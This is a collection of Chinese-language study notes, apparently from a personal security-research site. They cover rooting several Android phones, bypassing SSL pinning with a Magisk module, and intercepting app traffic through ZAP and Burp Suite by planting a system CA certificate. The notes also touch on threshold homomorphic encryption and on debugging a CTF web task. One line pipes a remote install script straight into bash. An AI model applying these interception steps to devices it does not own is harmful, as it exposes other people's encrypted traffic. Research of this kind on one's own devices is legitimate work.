emulator64_x86_64_arm64:/ # ls /data/data android com.android.simappdialog android.auto_generated_rro_product__ com.android.simappdialog.auto_generated_rro_product__ android.auto_generated_rro_vendor__ com.android.soundpicker ... ASUS ZenFone 3(Z017DA) # 這一台是Lab的手機，我拿到的時候就已經進入Bootloader了，所以我就直接跳到後半段，但是這一台應該是刷壞了，我先紀錄一下整個過程，現在是已經無線迴圈同一個畫面了QAQ\nInstall Third Party Recovery # 我是參考給老手的 Zenfone 3 刷機快速上手（Bootloader, Recovery, Root, Rom…）\n我是以OrangeFox為例，因為如果實際去看TWRP，會發現唯獨缺了ZenFone3的Img 安裝方法是: 下載OrangeFox Img 進入fastboot $ adb reboot bootloader 確認fastboot有抓到device並且把recovery檔案丟進去 $ fastboot devices H7AZCY01Z728HGB fastboot $ fastboot flash recovery recovery.img Warning: skip copying recovery image avb footer (recovery partition size: 0, recovery image size: 31850496). Sending \u0026#39;recovery\u0026#39; (31104 KB) OKAY [ 0.726s] Writing \u0026#39;recovery\u0026#39; OKAY [ 0.359s] Finished. Total time: 1.185s 此時，直接切換到Recovery模式(音量鍵- + 電源鍵)，要按久一點，應該會回到一開始的頁面，也就是10秒內沒有選擇要去哪裡就預設Restart，此時要選擇去到Recovery的地方，那這樣我們就可以進入OrangeFox的系統 到這邊理論上都沒有什麼問題，但是我按照這個影片提到的要把剛剛載的image zip檔案丟進去並且安裝，但是就會跑出如下錯誤: ![125588](https://hackmd.io/_uploads/rymaNviC6.jpg =200x) 看了XDA的留言串，發現也有人有這個問題，雖然時間有點久，但我還是嘗試問看看該名網友有沒有找到解決方法 HTC 10 # Unlock Bootloader # 註冊HTCdev 選擇標的 進入開發者模式 啟動OEM解鎖 關機 按著音量鍵下 + 電源鍵進入Fastboot 接上電腦後用前面安裝的fastboot++下指令 C:\\Program Files (x86)\\ADB and Fastboot++\u0026gt;fastboot oem get_identifier_token (bootloader) [KillSwitch] : /dev/block/bootdevice/by-name/frp (bootloader) [KillSwitch] Last Byte is 0X01, enable unlock (bootloader) (bootloader) \u0026lt; Please cut following message \u0026gt; (bootloader) \u0026lt;\u0026lt;\u0026lt;\u0026lt; Identifier Token Start \u0026gt;\u0026gt;\u0026gt;\u0026gt; (bootloader) 5AD6E332F11F68FA4D0B820709F5F484 (bootloader) F9FCA8C301C6479544B350B86652DCED (bootloader) F1D0D367B49E0446C9697859C05FD9DD (bootloader) DB74A5312EBBC6298DB8635F04BDDA2E (bootloader) 1BF5BB63E5B09F3C1DFD02004B705E22 (bootloader) 0F3CF67C948A30217139C9CF8A5B71D8 (bootloader) A6D9E15DC0EA30BDE41B6D2057737343 (bootloader) B87E8C56B1C27FF7F1E7FE67703EDA32 (bootloader) A6D17FA27764CF7FA8D9BF397860D64B (bootloader) 0E9EE351C663BCB6E21F8916723110E1 (bootloader) F4398F6521FEF73F3F54CA8DAABD00A4 (bootloader) 4D63AF96305C61EBD5F625CF64AC5558 (bootloader) EA35A42E7F061B3E2D6D854A6F3DC204 (bootloader) 336D9F145BC218986BAAAFCBE149A8C6 (bootloader) 4D338857042EAE2224CB9EB1827EF86F (bootloader) A56D01AD0F5921E9A3F6A33FC9C287B6 (bootloader) \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt; Identifier Token End \u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; OKAY [ 0.175s] Finished. Total time: 0.176s 回到剛剛的HTCdev網頁後按下一步，在下面貼上剛剛得到的Token ![圖片](https://hackmd.io/_uploads/rJLL-boCT.png =300x) 沒意外的話他會寄送一封mail到註冊時填寫的email 把寄送的檔案放到fastboot++同一個資料夾後，直接在fastboot++下command $ C:\\Program Files (x86)\\ADB and Fastboot++\u0026gt;fastboot flash unlocktoken unlock_code.bin Sending \u0026#39;unlocktoken\u0026#39; (0 KB) OKAY [ 1.005s] Writing \u0026#39;unlocktoken\u0026#39; (bootloader) flash unlocktoken (bootloader) [KillSwitch] : /dev/block/bootdevice/by-name/frp (bootloader) [KillSwitch] Last Byte is 0X01, enable unlock (bootloader) unlock token check successfully OKAY [ 0.033s] Finished. Total time: 1.050s 按下Enter之後，在手機端應該會出現要不要解鎖的訊息，直接用音量鍵選擇Yes並且用電源鍵確認就會直接解鎖了 Install Third Party Recovery # 我是參考 How to Root the HTC 10 直接去TWRP - HTC 10下載img，然後按照上面的guidelines進行安裝 :::info 這邊記得是$ adb reboot download，和平常的reboot到bootloader不一樣喔 ::: 下adb command $ adb reboot download $ fastboot flash recovery twrp.img Warning: skip copying recovery image avb footer (recovery partition size: 0, recovery image size: 30965760). Sending \u0026#39;recovery\u0026#39; (30240 KB) OKAY [ 1.976s] Writing \u0026#39;recovery\u0026#39; (bootloader) HOSD CL#857212 (bootloader) start@1 (bootloader) recovery@100% (bootloader) Update partition OK (bootloader) end@Done OKAY [ 2.774s] Finished. Total time: 4.765s $ fastboot reboot Rebooting OKAY [ 0.001s] Finished. Total time: 0.002s 在手機端安裝Magisk並且在電腦端也下載同一個apk，接著進到TWRP Recover的地方，原本到這邊應該就直接在Install的地方進行安裝Magisk，但是就如同阿哲的影片所說，這一台手機也是無法直接在TWRP進行安裝apk的，也是要用sideload才可以 $ adb reboot bootloader sideload進行安裝 在TWRP中點選Advanced，然後點選sideload並且wipe cache，下完command後點選reboot system後就結束了 $ adb sideload Magisk-v27.0.apk Total xfer: 3.01x 測試 $ adb shell htc_pmeuhl:/ $ whoami shell htc_pmeuhl:/ $ su htc_pmeuhl:/ # whoami root 後記 # 因為要做實驗，也就是為了繞過SSL Pinning的問題要安裝==AlwaysTrustUserCerts==這個模組，所以magisk我是安裝\nSONY Xperia 10 III(XQ-BT52) # 結論：這一隻root的過程還蠻順利的，但最後結果還是失敗，不是說root失敗而是出現wifi網卡不能用的情況，但只要連接SIM卡還是可以用的，但就跟我的研究沒關係了\nUnlock Bootloader # 在通話的地方輸入*#*#7378423#*#*就會進入工程機畫面 選擇Service Info -\u0026gt; Configuration中會出現Bootloader unlock allowed: Yes(No)的提示，如果是Yes再往下進行 接著回到電話播打處打上*#06#就會跳出IMEI Code ![Screenshot_20240322-212046](https://hackmd.io/_uploads/ryZRhZjCa.png =200x) 到Sony Unlock官網，選擇手機的型號並且輸入剛剛得到的IMEI Code Submit後會給另外一個Code 這一部分和哲有一點點不一樣，我是參考Sony Xperia 10 V (XQ-DC72) Root教學，解鎖Bootloader與刷Magisk，先想辦法進入開發者模式後，開啟adb debugging並且開啟OEM解鎖，接著連接電腦重啟 $ adb devices List of devices attached HQ615A42D4 device $ adb -s HQ615A42D4 reboot bootloader $ fastboot oem unlock 0xF8E5B9BD1CA8816F OKAY [ 3.969s] Finished. Total time: 3.973s 刷入修補過的boot.img # 這一部分就幾乎都是看 How to root Sony Xperia 10 V and flash Magisk Install XperiaFirm 選擇自己的型號並且下載，下載完後他會自己解壓縮 下載sony_dump並且把對應的電腦架構放到剛剛的下載的img folder(windows是sony_dump.exe) 在該資料夾執行command，command後面接的檔案試不同型號會有不一樣的檔名，這點要特別注意 $ sony_dump.exe output boot_X-FLASH-ALL-8A63.sin -------------------------------------------------------- Sony File Dumper by Munjeni @ 2016 -------------------------------------------------------- Using folder \u0026#34;output\u0026#34; opening boot_X-FLASH-ALL-8A63.sin boot_X-FLASH-ALL-8A63.sin is Sony sin v5 format. Extracting from boot_X-FLASH-ALL-8A63.sin Extracting file output/boot_X-FLASH-ALL-8A63.crt Extracting file output/boot_X-FLASH-ALL-8A63.000 End of boot_X-FLASH-ALL-8A63.sin Done. 執行成功後應該會在同一個folder中出現output這個folder，把裡面的第一個檔案改成.img file，並且丟到手機端 在手機端安裝magisk後，用magisk安裝這個img，他會patch這個img 成功後應該會在手機同一個folder底下看到patch過後的img file，此時就直接把該檔案再丟回到電腦端並且在同一個folder底下開啟terminal $ adb devices List of devices attached HQ615A42D4 device $ adb reboot bootloader $ fastboot devices HQ615A42D4 fastboot $ fastboot flash boot magisk_patched-27000_k2w6q.img Sending \u0026#39;boot_a\u0026#39; (98304 KB) OKAY [ 2.167s] Writing \u0026#39;boot_a\u0026#39; OKAY [ 0.237s] Finished. Total time: 2.423s $ fastboot reboot Rebooting OKAY [ 0.000s] Finished. Total time: 0.001s 此時我們大致上就成功了，等待開機的時候會有一點久(約2-5分鐘不等)，請耐心等候 測試 $ adb shell XQ-BT52:/ $ whoami shell XQ-BT52:/ $ su XQ-BT52:/ # whoami root SONY Xperia Z3 # 解鎖Bootloader的方法和上面一模一樣\nInstall AlwaysTrustUserCert.zip Module # 前面的手機取得Root權限後，就要安裝這個模組，我們才能部分Bypass SSL Pinning的問題，步驟如下\n在電腦下載這個模組，並且按照指示進行壓縮後丟到手機端 並且把Zap的所有憑證準備好，通常如果只有一台裝置就會只有一個有效的憑證，但因為我有時候會桌電和筆電輪流切換，所以有兩個憑證 先在手機安裝憑證(詳細上網找，資源很多，通常一分鐘內就可以安裝完成) 安裝完了以後就在Magisk的Module分頁安裝剛剛壓縮的模組，如果沒意外的話應該會看到一個Reboot的按鈕，點擊後等重開機就完成了，如果安裝失敗可以看一下原因，我自己是遇到Magisk的版本需要更改 重開機完成後可以看一下憑證的信任單位，應該就會看到安裝的ZAP所屬的OWASP被手機信任，在安裝模組之前一定是沒有的 此時就可以測試，在電腦上開啟ZAP，然後把手機端的Proxy IP和Port設定好，理論上不管是手機端的瀏覽器封包或是部分App的流量就會被抓到 注意事項 # :::info 有一點要特別注意，如果先安裝模組再進行安裝，或是先前已經安裝過第一個憑證後續又再安裝另外一個但沒有重起，會造成和之前遇到的SSL Pinning一樣的狀況，也就是在第二個憑證的裝置只能抓到GET封包，所以正確的步驟是按照上面的流程，如果有多一台裝置的話，最保險的做法是先把之前所有安裝的憑證刪除→重新啟動→重新安裝\u0026quot;所有\u0026quot;的憑證→重新安裝Magisk模組→Reboot，就可以了 :::\n結論 # 最後只有HTC 10成功取得Root權限並且安裝AlwaysTrustUserCert.zip的模組，所以我的研究就圍繞在Google Pixel6a這一台原本已經Root好並且安裝好模組的手機以及HTC 10這一台\n"},{"id":125,"href":"/survey-papers/crypto/how-to-securely-collaborate-on-data_-decentralized-threshold-he-and-secure-key-update---notes/","title":"How to Securely Collaborate on Data: Decentralized Threshold HE and Secure Key Update - Notes","section":"Survey Papers","content":" How to Securely Collaborate on Data: Decentralized Threshold HE and Secure Key Update - Notes # tags: Meeting Paper NTU # :::info Kim, E., Jeong, J., Yoon, H., Kim, Y., Cho, J., \u0026amp; Cheon, J. H. (2020). How to securely collaborate on data: Decentralized threshold he and secure key update. IEEE Access, 8, 191319-191329. ::: [TOC]\nBackground # Threshold Homomorphic Encryption - 閾值同態加密在隱私計算中的應用 # :::spoiler\n單密鑰同態加密 只有一個私鑰，且不同公鑰加密的密文無法相互計算。 閾值同態加密（多密鑰加密） 支持多個私鑰，不同公鑰加密的密文可以互相計算。 問題 # 多方聯合計算最安全的途徑是各自生成、保存公私鑰,但由於算法限制,不同公鑰加密的信息無法進行相互計算,導致隱私計算無法進行 假設多方使用一套公私鑰,雖然計算可以順利進行,但系統安全性會大大下降,系統中只要有一方被成功攻擊,私鑰就會泄露。 假設多方使用一套公私鑰,則無法決定由哪個參與方生成公私鑰 Solution - Threshold Homomorphic Encryption # 由於單密鑰同態加密在實際應用中存在諸多關於密鑰使用、管理的問題,閾值同態加密(多密鑰同態加密)應運而生。簡單來說,閾值同態加密算法中存在多個私鑰、一個(或多個公鑰,使用該公鑰系統加密的密文之間可以相互計算,並且只有當參與解密的私鑰數量達到一定閾值時,才能成功解密密文,所以這種多密鑰同態加密算法又被稱為閾值同態加密\nDefinition # 閾值同態加密算法同樣可以概括為以下4個函數。(,,)\n$(pk, sk, ek) \\leftarrow Keygen(Params)$: 密鑰生成函數,其中$pk$是公鑰、$sk$是私鑰、$ek$是用於計算的密鑰 $c \\leftarrow Enc(pk, m)$: 加密函數,使用公鑰$pk$加密明文$m$信息得到密文$c$ $m \\leftarrow Dec(c, sk_1, sk_2,\\cdot \\cdot \\cdot ,sk_k)$: 解密函數,最少$k$個私鑰參與，才能解密得到明文 $c \\leftarrow Eval((c_1,pk_1,ek_1), (c_2, pk_2, ek_2), \\cdot \\cdot \\cdot , (c_N, pk_N, ek_N))$: 密文計算函數，在多個密文上進行計算、獲得最終結果，計算過程需要密鑰$ek$參與 ::: Learning with Errors (LWE) # 多密鑰同態加密 # :::spoiler\n多密鑰同態加密的概念，以及基於NTRU密碼系統的具體實現，最早由L’opez-Alt等人描述。該方案的一個缺點是，在密鑰生成時必須知道參與方數量的上限，因為參數隨著參與方數量的增加而增加。(類似的實現在LWE下是可能的，但它只支持固定數量的參與方) :::\nNorm / Infinity Norm # :::spoiler\nNorm：一般翻譯成範數 (在英語中 norm 有規範的意思，比如我們說normalization就是把某種東西/物品/事件 做 正規化，也就是加上規範使其正常化)，不過個人認為其實翻譯成 範數 也是看不懂的\u0026hellip;這邊建議把 Norm 想成長度就好 (事實上norm是長度的抽象推廣)，\n也許讀者會認為好端端的長度不用，為何又要發明一個 norm 來自討苦吃?? 既抽象又艱澀。\n事實上想法是這樣的： 比如說現在想要比較兩個數字 $3 , 5$ 之間的大小，則我們可以馬上知道 $3\u0026lt;5$；同樣的，如果再考慮小數與無理數如 $1.8753$ 與 $π$，我們仍然可以比較大小 $1.8753\u0026lt;π=3.1415\u0026hellip;$ 故可以發現我們有辦法對 \u0026ldquo;純量\u0026rdquo; 做明確的比大小，WHY? 因為前述例子中 $3, 5, 1.8753$ or $π$ 其各自的大小有辦法被 \u0026ldquo;measure \u0026ldquo;!\n但是如果是現在考慮的是一組數字 我們如何去measure 其大小呢?? 比如說 $$x:=[1, -2, 0.1, 0 ]^T$$ 上式的大小該是多少? 是 $1? −2? 0.1???$ 再者如果更過分一點，我們考慮一個矩陣 $$A = \\left[ {\\begin{array}{*{20}{c}} 1\u0026amp;2\\ 3\u0026amp;4 \\end{array}} \\right]$$ 也正是如此，可以發現我們確實需要新的 \u0026ldquo;長度\u0026rdquo; 的定義來幫助我們如何去 measure 矩陣/向量/甚至是函數的大小。\n故此，我們首先定義甚麼是Norm，(也就是把 \u0026ldquo;長度\u0026rdquo; or \u0026ldquo;大小\u0026rdquo; 的本質抽離出來)\nL-infinity norm給出了一個向量的每個元素中最大的那個元素幅值。 例如，對於向量 $X= [-6, 4, 2]$，其 L-infinity norm就是$6$。 在L-infinity norm中，只有最大的元素有才具有影響。因此，例如，如果你的向量代表建造一座建築物的成本，通過最小化L-infinity norm，我們就可以做到減小建築物最昂貴的那部分成本。 :::\nIn This Paper # Threshold HE VS. Multi-Key HE # 兩者的差別依照原文的解釋是整合之前產生共同的公鑰的就是Threshold HE，而在整合之後產生公鑰的就是Multi-Key HE\nProactive Secrete Sharing # :::spoiler\n主動式秘密共享方案是指對移動敵手安全的秘密共享方案，這些敵手可以在一段時間內監視秘密共享者，但對一個時間單位內可訪問的共享者數量有限制。為了保護共享的秘密不被對手發現，應定期更新共享的秘密，使共享的秘密保持不變，以前的共享不再有用 :::\nWhat is Homomorphic encryption evaluation key # :::spoiler\nIn short # Public key is used to encrypt, private key is used to decrypt, and evaluation key is used to perform homomorphic operations (usually, homomorphic product or, the somehow equivalent operation, a logic AND gate).\nIn detail # Public and private keys in homomorphic encryption (HE) schemes are just the same as in other types of schemes.\nThe evaluation key ($evk$) is also public, it is typically generated using the private key, and it is used to control the noise growth or the ciphertext expansion during homomorphic evaluation.\nSome schemes have a \u0026ldquo;Key-switching\u0026rdquo; key instead of the evaluation key, but they are more or less the same. For instance, in the description of FV and YASHE, you can see that to perform a homomorphic product, one first multiplies the ciphertexts, $\\tilde{c}{mult} := c_1 \\otimes c_2$, then uses this \u0026ldquo;extra public key\u0026rdquo; to adjust $\\tilde{c}{mult}$, that is, to get a ciphertext cmult\nwith the correct dimension and that can be decrypted using the original secret key.\nSo, in general, this is how you use $evk$: you perform a homomorphic operation that introduces a lot of noise or that generates a ciphertext in higher dimension, then you perform an extra operation using $evk$ to \u0026ldquo;correct\u0026rdquo; that ciphertext. :::\n"},{"id":126,"href":"/problem-solutions/how-to-use-vscode-_-web-storm-debug-js_/","title":"How to use VScode / Web Storm Debug JS?","section":"Problem Solutions","content":" How to use VScode / Web Storm Debug JS? # Background # 了解node.js nvm npm差別\nPrepare JS Modules # 當拿到一個web題目，通常會包含Dockerfile / docker-compose.yml / package.json，我們要做的就是把這個專案所需要的library都載好，這些通常都會記錄在package.json中\nWindows 在windows也需要下載js的interpreter，也就是node js / npm這些東西，詳細可以看MSDN文件 到nvm windows github官方下載latest ==nvm-setup.exe==並安裝 $ nvm --version 1.1.12 $ nvm ls # 列出目前node js的已安裝的版本有哪些 No installations recognized. # 因為目前都沒有所以No installations $ nvm list available # 列出目前可安裝的版本有哪些 | CURRENT | LTS | OLD STABLE | OLD UNSTABLE | |--------------|--------------|--------------|--------------| | 21.5.0 | 20.10.0 | 0.12.18 | 0.11.16 | | 21.4.0 | 20.9.0 | 0.12.17 | 0.11.15 | | 21.3.0 | 18.19.0 | 0.12.16 | 0.11.14 | | 21.2.0 | 18.18.2 | 0.12.15 | 0.11.13 | | 21.1.0 | 18.18.1 | 0.12.14 | 0.11.12 | | 21.0.0 | 18.18.0 | 0.12.13 | 0.11.11 | | 20.8.1 | 18.17.1 | 0.12.12 | 0.11.10 | | 20.8.0 | 18.17.0 | 0.12.11 | 0.11.9 | | 20.7.0 | 18.16.1 | 0.12.10 | 0.11.8 | | 20.6.1 | 18.16.0 | 0.12.9 | 0.11.7 | | 20.6.0 | 18.15.0 | 0.12.8 | 0.11.6 | | 20.5.1 | 18.14.2 | 0.12.7 | 0.11.5 | | 20.5.0 | 18.14.1 | 0.12.6 | 0.11.4 | | 20.4.0 | 18.14.0 | 0.12.5 | 0.11.3 | | 20.3.1 | 18.13.0 | 0.12.4 | 0.11.2 | | 20.3.0 | 18.12.1 | 0.12.3 | 0.11.1 | | 20.2.0 | 18.12.0 | 0.12.2 | 0.11.0 | | 20.1.0 | 16.20.2 | 0.12.1 | 0.9.12 | | 20.0.0 | 16.20.1 | 0.12.0 | 0.9.11 | | 19.9.0 | 16.20.0 | 0.10.48 | 0.9.10 | 選擇一個版本安裝 $ nvm install 20.10.0 Downloading node.js version 20.10.0 (64-bit)... Extracting node and npm... Complete npm v10.2.3 installed successfully. Installation complete. If you want to use this version, type nvm use 20.10.0 選擇已安裝的版本 $ nvm use 20.10.0 Now using node v20.10.0 (64-bit) 接著就可以只用npm / node安裝專案需要的package $ cd \u0026#34;Double Injection\\app\u0026#34; $ ls 目錄: D:\\Double Injection\\app Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 2023/12/18 下午 05:52 1786 app.js -a---- 2023/12/29 上午 01:19 1160 exp.py -a---- 2023/12/18 下午 10:16 13 flag.json -a---- 2023/12/18 下午 05:26 470 init-db.js -a---- 2023/12/18 上午 06:16 110 package.json $ npm install # 安裝所有package.json中的library WSL / Linux 同樣的操作需要再做一次，詳細可以看MSDN - 在 Windows 子系統 Linux 版 (WSL2) 上安裝 Node.js Install nvm $ sudo apt-get install curl $ curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/master/install.sh | bash $ nvm --version 0.39.7 Check Current Available Version $ nvm ls -\u0026gt; system iojs -\u0026gt; N/A (default) node -\u0026gt; stable (-\u0026gt; N/A) (default) unstable -\u0026gt; N/A (default) Install Long Term Support $ nvm install --lts Installing latest LTS version. Downloading and installing node v20.10.0... Downloading https://nodejs.org/dist/v20.10.0/node-v20.10.0-linux-x64.tar.xz... ############################################################################################################ 100.0% Computing checksum with sha256sum Checksums matched! Now using node v20.10.0 Creating default alias: default -\u0026gt; lts/* (-\u0026gt; v20.10.0) $ nvm ls -\u0026gt; v20.10.0 system default -\u0026gt; lts/* (-\u0026gt; v20.10.0) iojs -\u0026gt; N/A (default) unstable -\u0026gt; N/A (default) node -\u0026gt; stable (-\u0026gt; v20.10.0) (default) stable -\u0026gt; 20.10 (-\u0026gt; v20.10.0) (default) lts/* -\u0026gt; lts/iron (-\u0026gt; v20.10.0) lts/argon -\u0026gt; v4.9.1 (-\u0026gt; N/A) lts/boron -\u0026gt; v6.17.1 (-\u0026gt; N/A) lts/carbon -\u0026gt; v8.17.0 (-\u0026gt; N/A) lts/dubnium -\u0026gt; v10.24.1 (-\u0026gt; N/A) lts/erbium -\u0026gt; v12.22.12 (-\u0026gt; N/A) lts/fermium -\u0026gt; v14.21.3 (-\u0026gt; N/A) lts/gallium -\u0026gt; v16.20.2 (-\u0026gt; N/A) lts/hydrogen -\u0026gt; v18.19.0 (-\u0026gt; N/A) lts/iron -\u0026gt; v20.10.0 Check npm / node Version $ npm --version 10.2.3 $ node --version v20.10.0 安裝Module(一樣是在有package.json的目錄下) $ npm install Debug By VScode # 詳細可以看MSDN的教學 :::info 在debug的過程中，有可能會因為是linux based的路徑，所以造成錯誤，所以最好還是在wsl中用code .的方式進入VScode，再進行debug，另外提醒，在linux or windows下npm install所載的package會根據OS不一樣而有差異，所以要搞清楚目前的平台是哪一個再進行debug；再另外，因為大部分的題目都是具備docker，所以在build之前要先確定有沒有都完成原本docker幫忙的事情，例如以下script:\nFROM node:alpine RUN mkdir -p /usr/src/app WORKDIR /usr/src/app COPY ./app . RUN yarn install RUN echo \u0026#39;FLAG{flag-1}\u0026#39; \u0026gt; /flag1.txt RUN echo \u0026#39;FLAG{flag-2}\u0026#39; \u0026gt; \u0026#34;/flag2-$(tr -dc \u0026#39;a-zA-Z0-9\u0026#39; \u0026lt; /dev/urandom | head -c 16).txt\u0026#34; RUN node ./init-db.js \u0026amp;\u0026amp; chmod 444 /etc/db.sqlite3 RUN adduser -D -h /home/ctf ctf RUN chown -R ctf:ctf /usr/src/app USER ctf CMD [ \u0026#34;node\u0026#34;, \u0026#34;app.js\u0026#34; ] 這是NTU CS 2023 HW - Double Injection的題目，首先他有準備/flag1.txt以及/flag2-{random strings}.txt這兩個檔案，以及/etc/db.sqlite3這個file，並且run了init-db.js，這些都是要自己處理的部分，不然單單debug app.js會出一大堆問題 :::\nDownload Web Storm # 到官網下載對應OS的Installer，不過這東西是要收費的，如果要白嫖的話可以參考Jetbrain 軟體教育許可授權申請流程，不過台大的帳號不知道為啥會過不了，所以要用提供官方文件的方式申請\n:::danger 後續的操作其實就和vscode差不了多少，有點懶得寫了，而且web storm還需要收錢，但vscode也沒多難用，只是如果習慣用他們家的會蠻好操作的就是了，包含直接和docker連動之類的，但debug還是要用local端build起來(就是上面vscode的流程那樣)，也是沒有方便多少 :::\n"},{"id":127,"href":"/problem-solutions/how-to-use-zap_burp-suite_mitmproxy-as-proxy-for-android_/","title":"How to use ZAP/Burp Suite/mitmproxy as Proxy for Android?","section":"Problem Solutions","content":" How to use ZAP as Proxy? # 根據1我大概知道怎麼使用，我們通常會使用zap的command line形式進行操作，詳細的參數可以參考Official Document，另外我看ZAP如果要當作Proxy的角色會需要用到ROOT CA憑證，所以如果單純用之前的教學文章會不知到在哪裡產生憑證，他已經移動到Network底下了 ![image](https://hackmd.io/_uploads/B11DaMnpT.png =400x)\n目前我把Proxy架好了，看的是這篇教學文章-OWASP ZAP操作手冊，講的非常詳細\n在Firefox中搜尋憑證或是cert，直接安裝在ZAP產生的憑證檔案 在Firefox的setting中搜尋Proxy ![圖片](https://hackmd.io/_uploads/HJ4NI5Aap.png =400x) 設定成如下 ![圖片](https://hackmd.io/_uploads/HJoGB9CTa.png =400x) 只要ZAP有打開，就可以連線出去，但如果Proxy已經setup，卻沒有打開ZAP會通不到外面喔 補充 # 如果上述的步驟已經執行完但Proxy只能攔截到GET Method的封包，就代表憑證爛掉了，和在手機上一樣，但手機會出現這個問題還有可能是SSL Pinning，網頁端只需要重新安裝ZAP Generate的新憑證就好 如果設定Firefox的Proxy時，是設定成使用系統Proxy設定，那就要在電腦的設定中，更改Proxy的config ![圖片](https://hackmd.io/_uploads/HJ6STMP1R.png =400x) 這樣的話ZAP也可以正常運作，但是就不會出現ZAP特定的畫面(功能) ![圖片](https://hackmd.io/_uploads/ByAxAfPyA.png =400x) 只有設定成手動設定Proxy才會出現，否則會變成連線不上的畫面 How to use Burp Suite as Proxy? # 這個完全是翻譯並且按照 Intercepting Android App Traffic with BurpSuite 的影片教學\nPrepare # (有取得Root實機的情況下) # 如果要保險一點零失敗的達成目標，按照影片的步驟和環境比較好，如果是已經有一台取得Root的實機，就可以忽略用VMware開的Emulator\n取得Burp Suite Cert(在開啟Burp Suite的前提下) 有關於DER和PEM的背景知識可以參考[背景知識] 憑證的格式 PEM 與 DER | 自然人憑證開發筆記 $ curl localhost:8080/cert -o cert.der # 這一段是強制把der檔案轉換成pem檔案 $ openssl x509 -inform der -in cert.der -out cert.pem 丟到手機端後直接在手機安裝憑證 接著就要參考How to Root Android Phone \u0026amp; Install AlwaysTrustUserCert.zip Module?這篇文章下面註解的地方重新安裝AlwaysTrustUserCert.zip這個plugin，最保險的做法是 先把之前所有安裝的憑證刪除→ 重新啟動→ 重新安裝\u0026quot;所有\u0026quot;的憑證→ 重新安裝Magisk模組→ Reboot 接著就直接跳到下一段(實際攔截前) (利用VMware開Emulator) # VMware 記得啟動 Virtualization 安裝Genymotion, virtualbox, adb 安裝前先到Genymotion官網註冊帳號 $ wget https://dl.genymotion.com/releases/genymotion-3.6.0/genymotion-3.6.0-linux_x64.bin $ chmod +x genymotion-3.6.0-linux_x64.bin $ ./genymotion-3.6.0-linux_x64.bin $ sudo apt install virtualbox adb -y $ cd genymotion $ ./genymotion # login to genymotion 選擇Emulator的手機型號就可以開啟一個全新的Emulator 取得Burp Suite Cert(在開啟Burp Suite的前提下) 有關於DER和PEM的背景知識可以參考[背景知識] 憑證的格式 PEM 與 DER | 自然人憑證開發筆記 $ curl localhost:8080/cert -o cert.der # 這一段是強制把der檔案轉換成pem檔案 $ openssl x509 -inform der -in cert.der -out cert.pem # 這一段是顯示cert.pem這個檔案Subject的MD5 Hash Value，至於他怎麼做hash的，可以參考https://github.com/spacemonkeygo/openssl/issues/112#issuecomment-443313713，他解釋該hash的標的為哪些，並不是針對這整個file做hash $ openssl x509 -inform PEM -subject_hash_old -in cert.pem 9a5ba575 -----BEGIN CERTIFICATE----- MIIDpzCCAo+gAwIBAgIEdz+xgjANBgkqhkiG9w0BAQsFADCBijEUMBIGA1UEBhML UG9ydFN3aWdnZXIxFDASBgNVBAgTC1BvcnRTd2lnZ2VyMRQwEgYDVQQHEwtQb3J0 U3dpZ2dlcjEUMBIGA1UEChMLUG9ydFN3aWdnZXIxFzAVBgNVBAsTDlBvcnRTd2ln Z2VyIENBMRcwFQYDVQQDEw5Qb3J0U3dpZ2dlciBDQTAeFw0xNDA4MjgxMzUxMzda Fw0zMzA4MjgxMzUxMzdaMIGKMRQwEgYDVQQGEwtQb3J0U3dpZ2dlcjEUMBIGA1UE CBMLUG9ydFN3aWdnZXIxFDASBgNVBAcTC1BvcnRTd2lnZ2VyMRQwEgYDVQQKEwtQ b3J0U3dpZ2dlcjEXMBUGA1UECxMOUG9ydFN3aWdnZXIgQ0ExFzAVBgNVBAMTDlBv cnRTd2lnZ2VyIENBMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwCM2 OEX9sby5W3ck1djqnohtIpNKIkBWw0qvwDfi17Hvyc0YIUPzQE+6o/a1KRgCS6Ni 2SgcJ/soKcRkMn5nmI5Mh+6w0NGEd13VmIcSkd97RghpeNivd5u0LOHW4KVYmxh9 0pDlt+6DD2zQIShM0hxUTGpaaPaRk9S9z0kWHNyJ9cfy627IWDSl1oNrQvNYTWU4 DhjBa0AOQUjCrTqkCALwCEAErZRGgjeonkola117DFG8twdjdA+55Iegw2Bd8ogd JafibIUutXwGFiaAxx/ckapkqUKFnjBbXwyfoFmeiuiHqB3oy8Y8tduSh1e9lJNq bMWW+UDG/4H5kXNOgwIDAQABoxMwETAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3 DQEBCwUAA4IBAQAn4BB23JUP0EThzsQY/299zJW0Z1AquMwYRYtWhhno+OoQ8gHu zKNQHdV2RHr/Ns4z7tP7aNyWiCgSmmOwJ/0l7pY74NjxbZPdqVnHMy5Vg6ehggOH ShKk6N561W4856G2AaiOqtY1a84wj1l5GtAtSbfVJtu3SdOvdiR2oD8C8IWx71VN EGjEuIkbWdyysVQkhXkn1GAl8E3CRPqDrqJL4HA9CSAPEvvhbpUvJ/j+dqp+bH68 kPBVOVVKdzUBbngYeRpSwGm2WlbZ8RiWoeodsixPKiK2tSqtGG+D1H/bOKH/aq8x PVGwpBZqfagUIDw+E1x1zmbtUkpY5nHCAcEo -----END CERTIFICATE----- # 複製cert.pem並改名成9a5ba575.0，會改成這樣是因為手機當中儲存憑證的方式就是這樣 $ cp cert.pem 9a5ba575.0 # 這一段是print出9a5ba575.0的subject，也就是上面做hash的標的就是下面這一串東西，所以只要是PortSwigger的憑證，只要他們沒有改subject，基本上做hash得到的結果都會是9a5ba575 $ openssl x509 -inform PEM -subject -in 9a5ba575.0 subject=C = PortSwigger, ST = PortSwigger, L = PortSwigger, O = PortSwigger, OU = PortSwigger CA, CN = PortSwigger CA 丟到手機端中儲存憑證的絕對位址 如果直接用adb push到該位置，會發現錯誤，原因是該位置是read only的狀態，所以我們要進到su進到root權限改變read only的狀態，再把東西丟進去就完成安裝了 $ adb shell # su # mount -o remount,rw / # exit # exit $ adb push 9a5ba575.0 /system/etc/security/cacerts/ 實際攔截前 # 打開的Burp Suite一定要把Bind to address改成All interfaces ![圖片](https://hackmd.io/_uploads/B1HBnVVPR.png =400x) 設定手機端的網路Proxy 這一部分就跟ZAP當初設定的時候一模一樣，當然也是可以像教學影片那樣用CLI的方式處理 $ adb shell settings put global http_proxy \u0026lt;proxy server ip\u0026gt;:8080 